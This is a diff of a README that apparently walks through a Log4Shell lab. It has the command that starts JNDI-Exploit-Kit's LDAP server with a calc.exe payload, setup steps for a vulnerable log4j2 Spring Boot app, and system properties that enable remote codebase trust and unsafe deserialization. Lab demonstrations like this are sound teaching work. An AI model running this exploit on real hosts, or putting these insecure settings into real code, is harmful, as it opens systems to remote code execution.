@@ -70,16 +70,15 @@
 - [x] *Run LDAP server*:
   - Move to the jar location and run the server using below command.
     `java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "calc.exe" -L <your private ip>:1389`
-  <br/>
-
   ![Alt Text](run_ldap.png)
   > *_NOTE:_*  Use **hostname -I | awk '{print $1}'** to ge the private IP.
- - [x] *Create a spring boot application using log4j2 dependence with version less than 2.15* 
+- [x] *Create a spring boot application using log4j2 dependence with version less than 2.15*: 
       -  Open any Java IDE (Eclipse or SpringToolSuite) 
-    ![createapp](http://g.recordit.co/UJqn2R3YVo.gif)
-     -  Replace pom.xml with below file & copy below LogController src/main/java a
-      [pom](pom.xml)
-      [LogController](LogController.java)
+         ![createapp](http://g.recordit.co/UJqn2R3YVo.gif)
+     -  Replace pom.xml with below file & copy below LogController src/main/java,
+     <br/>
+          [pom](pom.xml)
+          [LogController](LogController.java)
      - Add below lines in default file created under src/main/java --> *Application.java in main method. 
       `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");'
       `System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");'
